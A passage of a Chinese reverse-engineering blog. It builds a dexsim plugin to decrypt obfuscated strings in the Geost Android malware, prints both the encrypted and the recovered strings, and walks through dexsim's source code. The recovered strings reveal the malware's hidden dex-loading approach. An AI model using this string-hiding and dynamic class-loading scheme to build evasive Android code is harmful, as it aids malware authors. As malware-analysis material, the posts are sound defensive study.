&quot;40e2c22abf4d042c6e20a11e6ba7b2065f709005f6044ed3a4fe7835d041033a&quot;: [&quot;ѡ��&quot;],</span><br><span class="line">	&quot;d5f583b8ec55407eadf5a51dd3ff16b493fb94fae0e202ffd6000af1561bbd9f&quot;: [&quot;ġ��\\u000C3\\u0008��m����&quot;],</span><br><span class="line">	&quot;13a9e458bb010ab664661af1f4f08f084937847fc0768ca47ace65b17243fcb7&quot;: [&quot;(��\\u000B&quot;],</span><br><span class="line">	&quot;a0bcd2c1609d0cd07c8e2a41adbbb3cda932c6c6dca4bfefe481e0adbc83b0cd&quot;: [&quot;д��\\u000B&quot;],</span><br><span class="line">	&quot;7787842e5212469cec7aaa95cd6d8df30d34fb6d0e7a6f1713c0cb5df550f714&quot;: [&quot;ɥ��@,\\u0006誅z���=c�Wb���\\u0017e&#x27;�I&quot;],</span><br><span class="line">	&quot;4d44e4687a94b79a8665bdf15134fd026587af5eed3ecae594fafe6f1a9d891d&quot;: [&quot;ȯ��\\n*\\u0014��&#123;���(q�pa���\\u0015&quot;],</span><br><span class="line">	&quot;73101d880bbfd59702d96ecc3c47618dffdcf243bb3bd275484c002cb76e32db&quot;: [&quot;¶��\\u0017#\\u0008��&quot;],</span><br><span class="line">	&quot;8f03d383773c013569e3e1d910bd8c32fcbed206d3b5c7907bbb99310e33d617&quot;: [&quot;ɥ��@)\\u0008���d�ތ�.b�Gy����&quot;],</span><br><span class="line">	&quot;83718a06bf29a60b800595e9b9ca01708b6e7147b7a3513ecf7b7daa9516c24b&quot;: [&quot;Զ��\\u000B&quot;],</span><br><span class="line">	&quot;05711d0cc4b04eb073b4401b429f20868cba513f4828112442a2c64e379252d1&quot;: [&quot;ġ��\\u0002!\\u0014��i���&quot;],</span><br><span class="line">	&quot;454cf7696e8e0c6abcb6881b67a2831a5465ee7325ee08bf70cf4cc3f42d8e9c&quot;: [&quot;ǡ�&quot;],</span><br><span class="line">	&quot;40848d17e138ba5da879256aea50c6cda50167d856ad7c65ccfd15c60d15455b&quot;: [&quot;ū��\\u000F-\\u0002&quot;],</span><br><span class="line">	&quot;473b6b3f80874a14505ac2577547c5e7e3c96766c74f571bdd736c3844ae33c6&quot;: [&quot;����\\u000F,\\u0014��g���-c�y&#125;�浺[&gt;d�\\n�&quot;],</span><br><span class="line">	&quot;11b2149c2d5239839c10533b4e5363f104d69b7c79c5355ea45d8c5c884dce77&quot;: [&quot;ש��\\u0008)\\u000B�&quot;],</span><br><span class="line">	&quot;bc84eb8f3200f991cd94bf299877f0ffdec6503b41bc344e19e354c1acb1e794&quot;: [&quot;С�&quot;],</span><br><span class="line">	&quot;a47cf816863a4ecf54a03e1a6aaae35f33ddf4ba3f5139286e2bafa26bac0a6e&quot;: [&quot;����&quot;],</span><br><span class="line">	&quot;43ec42d64409376307a36c21db552f5335267593004c139ea1d2d5bd14d6c224&quot;: [&quot;̴�� /\\tǾ�m�ם&quot;],</span><br><span class="line">	&quot;04e8065097330a367c4cd538afc8678d6c9ef24584d7d20c07e94cc754a88816&quot;: [&quot;ǡ��\\u001A%&quot;],</span><br><span class="line">	&quot;561904e2cb0afd0008c5d16fbe3a4ba7cf0b5e5b13ba27eb8092287f0bfb96f8&quot;: [&quot;͡��\\u00003\\u0013��m&quot;],</span><br><span class="line">	&quot;77659956a9e869a9b051ac32cc4f457066332bb0195076d4ed1a8e8019ad4041&quot;: [&quot;ɥ��@,\\u0006誅J����?y&quot;],</span><br><span class="line">	&quot;c16af871c0dd1a66fc41afdc138004641939e1e2b78df4b157037466a5979423&quot;: [&quot;̾��&quot;],</span><br><span class="line">	&quot;f640b5ab7d87d84978011661e769a196fbd3198caaea6fa9263bfa745bd6dd88&quot;: [&quot;ġ��\\u000F3\\u0002Ţ�|���&quot;],</span><br><span class="line">	&quot;9153ef9514c3d163349095f4701d2cba5c06dd49c00c8a3c659d28ef81927040&quot;: [&quot;С��\\u000D#\\u0002��j��&quot;],</span><br><span class="line">	&quot;75dd6f4f0e3b7cffb60fc0fdae51becfb27ce3d6a7ad6518db5a7fe0fb4145fb&quot;: [&quot;ɥ��@,\\u0006誅K���\\u0012x�ph��&quot;],</span><br><span class="line">	&quot;ce505ef1025a3c319094bfd9c0173e62448f78ab255ab4af8d11520bd8767c73&quot;: [&quot;6��\\u001A%.��|���?z&quot;],</span><br><span class="line">	&quot;7a3b634862a85e9cdd1946f52e8080a613aaff393c75715971ed562f940e3e7d&quot;: [&quot;ɥ��@)\\u0008���d�&quot;],</span><br><span class="line">	&quot;cfdf953a68d2b070f380deaefaec4020a2851a2eebb9826f7079272f6b6edd88&quot;: [&quot;ɥ��@,\\u0006誅K���\\u0012x�ph�&quot;],</span><br><span class="line">	&quot;7a193ee83f77b5f3f484573fe8d7645066f0698cc31d9abfc80bd1ba32a9c158&quot;: [&quot;·��\\u001D3+��m�&quot;],</span><br><span class="line">	&quot;13aa89b020ddf7150202fa0bdfb9c28e9580edc3e2059eaf5ef5d12c7ac12bb2&quot;: [&quot;ͥ��&quot;],</span><br><span class="line">	&quot;2148fad735ee74a155c3b34327cde1ff3b50cd6e441f10a85babc7c9e3b9dad2&quot;: [&quot;+��\\u0007&#x27;I���&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续分析，发现 <code>Lcom/rgamtgid/hnsolues/QLwdDnU;-&gt;UGanmSarY([B)[B</code> 函数解密过程中需要成员变量 <code>GXGAvefgwV</code> 参与</p>
<img src="/2020/03/13/dexsim%E6%8F%92%E4%BB%B6-Geost/2020-03-13-15-01-28.png" class="">

<p>查找该成员变量的初始地方，发现 <code>UGanmSarY</code> 函数。</p>
<img src="/2020/03/13/dexsim%E6%8F%92%E4%BB%B6-Geost/2020-03-13-15-03-56.png" class="">

<p>该函数需要两个参数，继续找调用该函数的地方，发现在 <code>oVRoXE</code> 函数中被调用，并且 <code>oVRoXE</code> 为无参函数。</p>
<img src="/2020/03/13/dexsim%E6%8F%92%E4%BB%B6-Geost/2020-03-13-15-05-33.png" class="">

<p>到此为止找到了解密函数所需的所有参数，开始编写解密脚本以及修改 <code>dss</code> 代码，相关代码如下：</p>
<p><code>Geost.py</code> 代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import tempfile</span><br><span class="line">from json import JSONEncoder</span><br><span class="line"></span><br><span class="line">from colorclass.color import Color</span><br><span class="line">from dexsim import get_value</span><br><span class="line">from dexsim.plugin import Plugin</span><br><span class="line"></span><br><span class="line">PLUGIN_CLASS_NAME = &quot;Geost&quot;</span><br><span class="line"></span><br><span class="line"># fill-array-data v2, :array_2e</span><br><span class="line"># invoke-virtual &#123;p0, v2&#125;, Lcom/rgamtgid/hnsolues/QLwdDnU;-&gt;UGanmSarY([B)[B</span><br><span class="line"># move-result-object v2</span><br><span class="line"># invoke-direct &#123;v1, v2&#125;, Ljava/lang/String;-&gt;&lt;init&gt;([B)V</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Geost(Plugin):</span><br><span class="line">    name = PLUGIN_CLASS_NAME</span><br><span class="line">    enabled = True</span><br><span class="line">    tname = None</span><br><span class="line">    index = 3</span><br><span class="line"></span><br><span class="line">    def __init__(self, driver, smalidir):</span><br><span class="line">        Plugin.__init__(self, driver, smalidir)</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        if self.ONE_TIME:</span><br><span class="line">            return</span><br><span class="line">        self.ONE_TIME = True</span><br><span class="line">        print(&#x27;Run &#x27; + __name__, end=&#x27; &#x27;, flush=True)</span><br><span class="line"></span><br><span class="line">        regex = (</span><br><span class="line">            r&#x27;fill-array-data v\d+, :(\w+)\s+?&#x27;</span><br><span class="line">            r&#x27;invoke-virtual &#123;p0, v\d&#125;, (.*?);-&gt;(.*?)\(\[B\)\[B\s+?&#x27;</span><br><span class="line">            r&#x27;move-result-object v\d+\s+?&#x27;</span><br><span class="line">            r&#x27;invoke-direct &#123;(v\d+), v\d+&#125;, Ljava/lang/String;-&gt;&lt;init&gt;\(\[B\)V&#x27;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        ptn = re.compile(regex, re.MULTILINE)</span><br><span class="line">        for sf in self.smalidir:</span><br><span class="line">            for mtd in sf.get_methods():</span><br><span class="line">                self._process_mtd(mtd, ptn)</span><br><span class="line">        self.decode()</span><br><span class="line"></span><br><span class="line">    def _process_mtd(self, mtd, ptn):</span><br><span class="line">        body = mtd.get_body()</span><br><span class="line"></span><br><span class="line">        for item in ptn.finditer(body):</span><br><span class="line">            old_content = item.group()  # 匹配到的内容，用来替换</span><br><span class="line">            arg_pos, cname, mname, rtn_name = item.groups()</span><br><span class="line">            cname = cname[1:].replace(&#x27;/&#x27;, &#x27;.&#x27;)</span><br><span class="line">            # 通过参数位置获取参数值</span><br><span class="line">            rex = arg_pos + &#x27;\s*.array-data 1([\w\W\s]+?).end array-data&#x27;</span><br><span class="line">            ptn_arr = re.compile(rex, re.MULTILINE)</span><br><span class="line">            bjson = []</span><br><span class="line">            for it in ptn_arr.finditer(body):</span><br><span class="line">                arr = it.groups()</span><br><span class="line">                for i in arr[0].split(&quot;\n&quot;):</span><br><span class="line">                    i = i.strip()</span><br><span class="line">                    if i == &quot;&quot;:</span><br><span class="line">                        continue</span><br><span class="line">                    bjson.append(int(i.replace(&#x27;t&#x27;, &#x27;&#x27;), 16))</span><br><span class="line">            arguments = [&#x27;[B:&#x27; + str(bjson)]</span><br><span class="line">            json_item = self.get_json_item(cname, mname, arguments)</span><br><span class="line">            self.append_json_item(json_item, mtd, old_content, rtn_name)</span><br><span class="line"></span><br><span class="line">    def decode(self):</span><br><span class="line">        if not self.json_list or not self.target_contexts:</span><br><span class="line">            return</span><br><span class="line"></span><br><span class="line">        jsons = JSONEncoder().encode(self.json_list)</span><br><span class="line"></span><br><span class="line">        outputs = &#123;&#125;</span><br><span class="line">        with tempfile.NamedTemporaryFile(mode=&#x27;w+&#x27;, delete=False) as tfile:</span><br><span class="line">            tfile.write(jsons)</span><br><span class="line">        outputs = self.driver.decode(tfile.name)</span><br><span class="line">        os.unlink(tfile.name)</span><br><span class="line"></span><br><span class="line">        if not outputs:</span><br><span class="line">            return</span><br><span class="line"></span><br><span class="line">        for key, value in outputs.items():</span><br><span class="line">            if key not in self.target_contexts:</span><br><span class="line">                print(key, value, &quot;not in&quot;)</span><br><span class="line">                continue</span><br><span class="line">            for mtd, old_content, new_content in self.target_contexts[key]:</span><br><span class="line">                old_body = mtd.get_body()</span><br><span class="line">                new_content = new_content.format(value[0])</span><br><span class="line">                body = old_body.replace(old_content, new_content)</span><br><span class="line">                mtd.set_body(body)</span><br><span class="line">                self.make_changes = True</span><br><span class="line">                mtd.set_modified(True)</span><br><span class="line">        self.smali_files_update()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>dss</code> 相关代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public Object invoke(InvocationTarget target) &#123;</span><br><span class="line">    Class&lt;?&gt; clz = loadClass(target.getClassName());</span><br><span class="line">    if (clz == null) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Method mtd = getMethod(clz, target);</span><br><span class="line">    if (mtd == null) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object result = null;</span><br><span class="line">    Object obj = null;</span><br><span class="line">    try&#123;</span><br><span class="line">        Constructor&lt;?&gt; con = clz.getConstructor();</span><br><span class="line">        obj = con.newInstance();</span><br><span class="line">    &#125;catch (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    try &#123;</span><br><span class="line">        Object ret = null;</span><br><span class="line">        InvocationTarget aa= new InvocationTarget(null, null, &quot;oVRoXE&quot;, null, null);</span><br><span class="line">        Method init = getMethod(clz, aa);</span><br><span class="line">        init.invoke(obj,null);</span><br><span class="line">        ret = mtd.invoke(obj, target.getParameters());</span><br><span class="line">        result = new String((byte[])ret);</span><br><span class="line">    &#125; catch (IllegalAccessException ignore) &#123;</span><br><span class="line">        ignore.printStackTrace();</span><br><span class="line">    &#125; catch (InvocationTargetException ignore) &#123;</span><br><span class="line">        ignore.printStackTrace();</span><br><span class="line">    &#125; catch (ExceptionInInitializerError e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; catch (VerifyError e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最后开始解密，对应的解密结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;f2e3d508ee217c095861d260a3a9eee8f61603ed045bb4817fd28a7da11b3d9f&quot;: [&quot;getAssets&quot;],</span><br><span class="line">	&quot;38a80467b6d5b816cd91776ed8e51cce0df8a73d46bd47b7d188d1d84eaa678f&quot;: [&quot;hjgfwhd&quot;],</span><br><span class="line">	&quot;b4e499760697584cc82d02559489ce6a99e497ab066d1a2b34a33cbfce943193&quot;: [&quot;TRUE&quot;],</span><br><span class="line">	&quot;70216d6f207a1c0e370b7113334d14e9ebb12c766568369eda1a1f8afee15fc7&quot;: [&quot;/ydxwlab.jar&quot;],</span><br><span class="line">	&quot;d1cdc906ab0b7c1c64a29537e9c4020f52790b0ac1e5045eaf321e9bbfe14d6f&quot;: [&quot;mPackageInfo&quot;],</span><br><span class="line">	&quot;d0532ef95194e0763b588f5b2ac1304c5f15333bfda545f929b3c0a8885643c3&quot;: [&quot;files&quot;],</span><br><span class="line">	&quot;df2641fd22aa51c58d5150e925d75b797dac6cdd9491950a912b8c4230e22836&quot;: [&quot;getDir&quot;],</span><br><span class="line">	&quot;1c3fbc0ef0a73334f447ceb1e6eeb53afc8d38c5e054d4ceaef30ccd828b4ff3&quot;: [&quot;initial&quot;],</span><br><span class="line">	&quot;1a9a46b987f24ecf7d3be2e6501c7b6622d169a7af407a9e31ef0337bc0141d6&quot;: [&quot;dalvik.system.DexClassLoader&quot;],</span><br><span class="line">	&quot;ff3cb5db4c0284f1bfe203fee5804cd6724267b24ee7d9596f775cd5eead7c2e&quot;: [&quot;getConstructor&quot;],</span><br><span class="line">	&quot;40e2c22abf4d042c6e20a11e6ba7b2065f709005f6044ed3a4fe7835d041033a&quot;: [&quot;read&quot;],</span><br><span class="line">	&quot;d5f583b8ec55407eadf5a51dd3ff16b493fb94fae0e202ffd6000af1561bbd9f&quot;: [&quot;getAbsolutePath&quot;],</span><br><span class="line">	&quot;13a9e458bb010ab664661af1f4f08f084937847fc0768ca47ace65b17243fcb7&quot;: [&quot;close&quot;],</span><br><span class="line">	&quot;a0bcd2c1609d0cd07c8e2a41adbbb3cda932c6c6dca4bfefe481e0adbc83b0cd&quot;: [&quot;space&quot;],</span><br><span class="line">	&quot;7787842e5212469cec7aaa95cd6d8df30d34fb6d0e7a6f1713c0cb5df550f714&quot;: [&quot;java.lang.reflect.Constructor&quot;],</span><br><span class="line">	&quot;4d44e4687a94b79a8665bdf15134fd026587af5eed3ecae594fafe6f1a9d891d&quot;: [&quot;kkksdjsdnssvfsnvfsdlfkjew&quot;],</span><br><span class="line">	&quot;73101d880bbfd59702d96ecc3c47618dffdcf243bb3bd275484c002cb76e32db&quot;: [&quot;arraycopy&quot;],</span><br><span class="line">	&quot;8f03d383773c013569e3e1d910bd8c32fcbed206d3b5c7907bbb99310e33d617&quot;: [&quot;java.io.FileOutputStream&quot;],</span><br><span class="line">	&quot;83718a06bf29a60b800595e9b9ca01708b6e7147b7a3513ecf7b7daa9516c24b&quot;: [&quot;write&quot;],</span><br><span class="line">	&quot;05711d0cc4b04eb073b4401b429f20868cba513f4828112442a2c64e379252d1&quot;: [&quot;getClassLoader&quot;],</span><br><span class="line">	&quot;454cf7696e8e0c6abcb6881b67a2831a5465ee7325ee08bf70cf4cc3f42d8e9c&quot;: [&quot;dex&quot;],</span><br><span class="line">	&quot;40848d17e138ba5da879256aea50c6cda50167d856ad7c65ccfd15c60d15455b&quot;: [&quot;forName&quot;],</span><br><span class="line">	&quot;473b6b3f80874a14505ac2577547c5e7e3c96766c74f571bdd736c3844ae33c6&quot;: [&quot;.localsinfotimestamp1494987116&quot;],</span><br><span class="line">	&quot;11b2149c2d5239839c10533b4e5363f104d69b7c79c5355ea45d8c5c884dce77&quot;: [&quot;tmp_file&quot;],</span><br><span class="line">	&quot;bc84eb8f3200f991cd94bf299877f0ffdec6503b41bc344e19e354c1acb1e794&quot;: [&quot;set&quot;],</span><br><span class="line">	&quot;a47cf816863a4ecf54a03e1a6aaae35f33ddf4ba3f5139286e2bafa26bac0a6e&quot;: [&quot;%s%s&quot;],</span><br><span class="line">	&quot;43ec42d64409376307a36c21db552f5335267593004c139ea1d2d5bd14d6c224&quot;: [&quot;openNonAssetFd&quot;],</span><br><span class="line">	&quot;04e8065097330a367c4cd538afc8678d6c9ef24584d7d20c07e94cc754a88816&quot;: [&quot;delete&quot;],</span><br><span class="line">	&quot;561904e2cb0afd0008c5d16fbe3a4ba7cf0b5e5b13ba27eb8092287f0bfb96f8&quot;: [&quot;newInstance&quot;],</span><br><span class="line">	&quot;77659956a9e869a9b051ac32cc4f457066332bb0195076d4ed1a8e8019ad4041&quot;: [&quot;java.lang.Boolean&quot;],</span><br><span class="line">	&quot;c16af871c0dd1a66fc41afdc138004641939e1e2b78df4b157037466a5979423&quot;: [&quot;ozht&quot;],</span><br><span class="line">	&quot;f640b5ab7d87d84978011661e769a196fbd3198caaea6fa9263bfa745bd6dd88&quot;: [&quot;getBaseContext&quot;],</span><br><span class="line">	&quot;9153ef9514c3d163349095f4701d2cba5c06dd49c00c8a3c659d28ef81927040&quot;: [&quot;setAccessible&quot;],</span><br><span class="line">	&quot;75dd6f4f0e3b7cffb60fc0fdae51becfb27ce3d6a7ad6518db5a7fe0fb4145fb&quot;: [&quot;java.lang.ClassLoader2&quot;],</span><br><span class="line">	&quot;ce505ef1025a3c319094bfd9c0173e62448f78ab255ab4af8d11520bd8767c73&quot;: [&quot;createInputStream&quot;],</span><br><span class="line">	&quot;7a3b634862a85e9cdd1946f52e8080a613aaff393c75715971ed562f940e3e7d&quot;: [&quot;java.io.File&quot;],</span><br><span class="line">	&quot;cfdf953a68d2b070f380deaefaec4020a2851a2eebb9826f7079272f6b6edd88&quot;: [&quot;java.lang.ClassLoader&quot;],</span><br><span class="line">	&quot;7a193ee83f77b5f3f484573fe8d7645066f0698cc31d9abfc80bd1ba32a9c158&quot;: [&quot;mClassLoader&quot;],</span><br><span class="line">	&quot;13aa89b020ddf7150202fa0bdfb9c28e9580edc3e2059eaf5ef5d12c7ac12bb2&quot;: [&quot;name&quot;],</span><br><span class="line">	&quot;2148fad735ee74a155c3b34327cde1ff3b50cd6e441f10a85babc7c9e3b9dad2&quot;: [&quot;config.xml&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2020/03/13/dexsim%E6%8F%92%E4%BB%B6-Geost/2020-03-13-15-12-09.png" class="">]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>dex字符串解密</tag>
      </tags>
  </entry>
  <entry>
    <title>dexsim浅析</title>
    <url>/2020/02/16/dexsim%E6%B5%85%E6%9E%90/</url>
    <content><![CDATA[<!-- TOC -->

<ul>
<li><a href="#dexsim%E7%AE%80%E4%BB%8B">dexsim简介</a><ul>
<li><a href="#dexsim-%E6%BA%90%E7%A0%81%E6%B5%85%E6%9E%90">dexsim 源码浅析</a></li>
</ul>
</li>
</ul>
<!-- /TOC -->

<h1 id="dexsim简介"><a href="#dexsim简介" class="headerlink" title="dexsim简介"></a>dexsim简介</h1><p><a href="https://github.com/mikusjelly/dexsim">dexsim</a> 是利用动态调用实现字符串解密的工具，需要配合 <a href="https://github.com/mikusjelly/DSS">DSS</a> 使用。作者为 <code>mikusjelly</code> 。</p>
<h2 id="dexsim-源码浅析"><a href="#dexsim-源码浅析" class="headerlink" title="dexsim 源码浅析"></a>dexsim 源码浅析</h2><p><code>dexsim</code> 源码结构如下图所示，</p>
<img src="/2020/02/16/dexsim%E6%B5%85%E6%9E%90/2020-02-16-13-59-53.png" class="">

<p>其中关键解密方法在 <code>dexsim/Plugins</code> 中，当我们需要添加一个解密方法时直接在该目录中添加对应插件既可。</p>
<p>首先来看 <code>main</code> 方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    parser = argparse.ArgumentParser(prog=&#x27;dexsim&#x27;, description=&#x27;&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;f&#x27;, help=&#x27;APK 文件&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;-i&#x27;, &#x27;--includes&#x27;, nargs=&#x27;*&#x27;,</span><br><span class="line">                        help=&#x27;仅解密包含的类，如abc, a.b.c&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;-o&#x27;, help=&#x27;output file path&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;-d&#x27;, &#x27;--debug&#x27;, action=&#x27;store_true&#x27;, help=&#x27;开启调试模式&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;-s&#x27;, required=False, help=&#x27;指定smali目录&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;-p&#x27;, &#x27;--pname&#x27;, required=False, help=&#x27;加载指定插件，根据插件名字&#x27;)</span><br><span class="line">    # TODO parser.add_argument(&#x27;-b&#x27;, action=&#x27;store_true&#x27;, help=&#x27;开启STEP_BY_STEP插件&#x27;)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    start = time.time()</span><br><span class="line">    main(args)</span><br><span class="line">    finish = time.time()</span><br><span class="line">    print(&#x27;\n%fs&#x27; % (finish - start))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>该方法主要是解析参数</p>
<ul>
<li>-i 仅解密包含的类 参数格式为 <code>a.b.c</code> <code>a.b</code>， 后面会将其转换为 <code>a/b/c.smali</code> <code>a/b.smali</code> 。</li>
<li>-o 解密后输出文件的路径</li>
<li>-s 指定smali目录</li>
<li>-p 加载指定插件，根据插件名字</li>
</ul>
<p>在 <code>main()</code> 方法中，将 apk 中的多个 dex 合并为一个名为 <code>new.dex</code> 文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ptn = re.compile(r&#x27;classes\d*.dex&#x27;)</span><br><span class="line"></span><br><span class="line">zipFile = zipfile.ZipFile(apk_path)</span><br><span class="line">for item in zipFile.namelist():</span><br><span class="line">    if ptn.match(item):</span><br><span class="line">        output_path = zipFile.extract(item, tempdir)</span><br><span class="line">        baksmali(output_path, smali_dir)</span><br><span class="line">zipFile.close()</span><br><span class="line"></span><br><span class="line">dex_file = os.path.join(tempdir, &#x27;new.dex&#x27;)</span><br></pre></td></tr></table></figure>
<p>然后在使用 <code>smali</code> 将合并的 <code>dex</code> 转为 <code>samli</code> 文件, 并进一步解析。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smali(smali_dir, dex_file)</span><br><span class="line">dexsim_apk(args.f, smali_dir, includes, output_dex)</span><br></pre></td></tr></table></figure>
<p>上面的方法可以进行一下优化，没有必要将合并的 <code>dex</code> 进行反编译为 <code>smali</code> 文件,并且只能针对 <code>apk</code> 文件进行解密，可以增加对 <code>dex</code> 文件的解密。</p>
<p>接着看 <code>dexsim_apk</code> 方法.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dexsim(apk_file, smali_dir, includes)</span><br><span class="line">if output_dex:</span><br><span class="line">    smali(smali_dir, output_dex)</span><br><span class="line">else:</span><br><span class="line">    smali(smali_dir,</span><br><span class="line">          os.path.splitext(os.path.basename(apk_file))[0] + &#x27;.sim.dex&#x27;)</span><br></pre></td></tr></table></figure>
<p>发现该方法直接调用 <code>dexsim</code> 方法，然后解密完成，那么关键方法为 <code>dexsim</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def dexsim(apk_file, smali_dir, includes):</span><br><span class="line">    &quot;&quot;&quot;推送到手机/模拟器，动态解密</span><br><span class="line"></span><br><span class="line">    Args:</span><br><span class="line">        apk_file (TYPE): Description</span><br><span class="line">        smali_dir (TYPE): Description</span><br><span class="line">        includes (TYPE): Description</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    driver = Driver()</span><br><span class="line">    driver.push_to_dss(apk_file)</span><br><span class="line"></span><br><span class="line">    oracle = Oracle(smali_dir, driver, includes)</span><br><span class="line">    oracle.divine()</span><br></pre></td></tr></table></figure>
<p>在该方法中将 <code>dex</code> 文件推送到手机中，然后调用创建 <code>Oracle</code> 对象向，调用该对象的 <code>divine</code> 进行解密.</p>
<p>接下来看 Oracle 对象的 <code>__init__</code> 方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def __init__(self, smali_dir, driver, includes):</span><br><span class="line">     &#x27;&#x27;&#x27;</span><br><span class="line">     &#x27;&#x27;&#x27;</span><br><span class="line">     self.driver = driver</span><br><span class="line">     # 下面一段代码可以删除，因为我们传的includes参数已经去掉了 L</span><br><span class="line">     paths = []</span><br><span class="line">     if includes:</span><br><span class="line">         for item in includes:</span><br><span class="line">             paths.append(item[1:].split(&#x27;;&#x27;)[0])</span><br><span class="line"></span><br><span class="line">     self.smalidir = SmaliDir(smali_dir, include=paths, exclude=FILTERS)</span><br><span class="line">     self.plugin_manager = PluginManager(self.driver, self.smalidir)</span><br></pre></td></tr></table></figure>
<p>调用 <code>SmaliDir</code> 读取 smali 代码， 然后调用 <code>PluginManager</code> 加载插件。</p>
<p>接下来看看 <code>PluginManager</code> 如何加载所有插件的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def __init__plugins(self):</span><br><span class="line">    for path in sys.path:</span><br><span class="line">        if path and path in __file__:</span><br><span class="line">            pkg = __file__.replace(path, &#x27;&#x27;)</span><br><span class="line">            break</span><br><span class="line">    module_path = os.path.dirname(pkg)[1:].replace(</span><br><span class="line">        os.sep, &#x27;.&#x27;) + &#x27;.&#x27; + self.plugin_dir + &#x27;.&#x27;</span><br><span class="line"></span><br><span class="line">    tmp = [None] * len(self.plugin_filenames)</span><br><span class="line">    # 开始加载所有插件</span><br><span class="line">    for name in self.plugin_filenames:</span><br><span class="line">        spec = importlib.util.find_spec(module_path + name)</span><br><span class="line">        mod = spec.loader.load_module()</span><br><span class="line">        clazz = getattr(mod, mod.PLUGIN_CLASS_NAME)</span><br><span class="line">        if not issubclass(clazz, Plugin):</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">        if not clazz.enabled:</span><br><span class="line">            print(&quot;Don&#x27;t load plugin&quot;, clazz.name)</span><br><span class="line">            continue</span><br><span class="line">        tmp[clazz.index] = clazz(self.driver, self.smalidir)</span><br><span class="line"></span><br><span class="line">    for item in tmp:</span><br><span class="line">        if item:</span><br><span class="line">            self.__plugins.append(item)</span><br></pre></td></tr></table></figure>
<p>首先获取插件名，然后调用 <code>importlib.util.find_spec(module_path + name)</code> 加载插件，完成插件的加载。</p>
<p>接下来回到 <code>oracle.divine()</code> 方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def divine(self):</span><br><span class="line">    plugins = self.plugin_manager.get_plugins()</span><br><span class="line"></span><br><span class="line">    flag = True</span><br><span class="line">    smali_mtds = set()  # 存放已被修改的smali方法</span><br><span class="line">    while flag:</span><br><span class="line">        flag = False</span><br><span class="line">        for plugin in plugins:</span><br><span class="line">            # 调用插件的run方法</span><br><span class="line">            plugin.run()</span><br><span class="line">            # 更新smali_mtds 文件</span><br><span class="line">            smali_mtds = smali_mtds.union(plugin.smali_mtd_updated_set)</span><br><span class="line">            print(plugin.make_changes)</span><br><span class="line">            flag = flag | plugin.make_changes</span><br><span class="line">            plugin.make_changes = False</span><br><span class="line"></span><br><span class="line">    self.driver.adb.run_shell_cmd([&#x27;rm&#x27;, DSS_APK_PATH])</span><br></pre></td></tr></table></figure>
<p>关键的加密方法还是要看插件。</p>
<p>接下来看 Plugin 类，该类是所有插件的基类。先看看两个关键的成员变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># [&#123;&#x27;className&#x27;:&#x27;&#x27;, &#x27;methodName&#x27;:&#x27;&#x27;, &#x27;arguments&#x27;:&#x27;&#x27;, &#x27;id&#x27;:&#x27;&#x27;&#125;, ..., ]</span><br><span class="line">json_list = []  # 存放解密对象</span><br><span class="line"></span><br><span class="line"># [(mtd, old_content, new_content), ..., ]</span><br><span class="line"># [(方法体， 原始的内容，解密后的内容)，...,]</span><br><span class="line">target_contexts = &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>json_list 存放解密对象，将转成文件推送到手机中让 DSS 解析并动态执行，其格式如下</p>
